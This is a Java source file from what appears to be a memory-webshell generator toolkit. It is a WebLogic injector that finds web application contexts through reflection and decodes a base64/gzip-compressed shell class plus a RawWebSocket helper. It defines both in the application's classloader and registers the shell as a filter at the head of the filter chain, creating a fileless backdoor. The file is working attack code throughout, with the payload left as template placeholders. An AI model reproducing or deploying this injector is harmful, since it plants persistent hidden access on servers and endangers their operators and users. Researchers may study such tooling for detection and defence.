package com.reajason.javaweb.memshell.injector.weblogic;

import javax.management.MBeanServer;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * WebLogic RawWebSocket 注入器：在 WebLogic 普通 Filter 注入的基础上，
 * 先按 {@code &lt;shellClassName&gt;$RawWsHelper} defineClass helper，再实例化 shell。
 *
 * @author ReaJason
 */
public class WebLogicRawWsInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getHelperBase64String() {
        return "{{helperBase64Str}}";
    }

    public WebLogicRawWsInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        boolean injected = false;
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                    injected = true;
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        // 没有任何一个 context 就绪时不锁存，留待下次实例化重试
        ok = injected;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * weblogic.servlet.internal.WebAppServletContext
     * <p>
     * 注入器以单类 payload 下发，运行期只有本类可用，不能引用其它注入器类，
     * 上下文查找必须与 {@code WebLogicFilterInjector} 一样自包含。
     */
    @SuppressWarnings("unchecked")
    public static Set<Object> getContext() throws Exception {
        Set<Object> webappContexts = new HashSet<Object>();

        MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
        Map<String, Object> objectsByObjectName = (Map<String, Object>) getFieldValue(platformMBeanServer, "objectsByObjectName");
        if (objectsByObjectName != null) {
            for (Map.Entry<String, Object> entry : objectsByObjectName.entrySet()) {
                try {
                    if (entry.getKey().contains("Type=WebAppComponentRuntime")) {
                        Object value = entry.getValue();
                        Object managedResource = getFieldValue(value, "managedResource");
                        if (managedResource != null && managedResource.getClass().getSimpleName().equals("WebAppRuntimeMBeanImpl")) {
                            Object context = getFieldValue(managedResource, "context");
                            if (context != null) {
                                webappContexts.add(context);
                            }
                        }
                    }
                } catch (Throwable ignored) {
                    // 单个条目的反射失败不能丢弃已收集的 context，跳过继续
                }
            }
        }

        // 注入请求本身所在的应用上下文（WebLogic 10.3.6 的 workEntry 即 request）
        try {
            Object workEntry = getFieldValue(Thread.currentThread(), "workEntry");
            Object request = null;
            try {
                Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
                request = getFieldValue(connectionHandler, "request");
            } catch (Exception x) {
                request = workEntry;
            }
            if (request != null) {
                Object context = getFieldValue(request, "context");
                if (context != null) {
                    webappContexts.add(context);
                }
            }
        } catch (Throwable ignored) {
        }
        return webappContexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "classLoader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        defineHelper(classLoader);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    /**
     * helper 必须先于 shell 构造完成 define；shell 无参构造会按类名自行解析它。
     */
    @SuppressWarnings("all")
    private Class<?> defineHelper(ClassLoader classLoader) throws Exception {
        String helperName = getClassName() + "$RawWsHelper";
        try {
            return classLoader.loadClass(helperName);
        } catch (Throwable ignored) {
        }
        byte[] helperBytes = gzipDecompress(decodeBase64(getHelperBase64String()));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(classLoader, helperName, helperBytes, 0, helperBytes.length);
    }

    /**
     * 与 {@code WebLogicFilterInjector} 一致：经 WebLogic 自己的 FilterManager 注册，
     * 并放到过滤器链首位，保证 RawWebSocket 握手先于应用过滤器被接管。
     */
    @SuppressWarnings("unchecked")
    public void inject(Object context, Object shell) throws Exception {
        Object filterManager = invokeMethod(context, "getFilterManager", null, null);
        if (((Map) getFieldValue(filterManager, "filters")).containsKey(getClassName())) {
            return;
        }
        invokeMethod(filterManager, "registerFilter", new Class[]{String.class, String.class, String[].class, String[].class, Map.class, String[].class}, new Object[]{getClassName(), getClassName(), new String[]{getUrlPattern()}, null, null, new String[]{"REQUEST", "FORWARD", "INCLUDE", "ERROR"}});
        List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
        Object curFilterInfo = filterPatternList.remove(filterPatternList.size() - 1);
        filterPatternList.add(0, curFilterInfo);
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
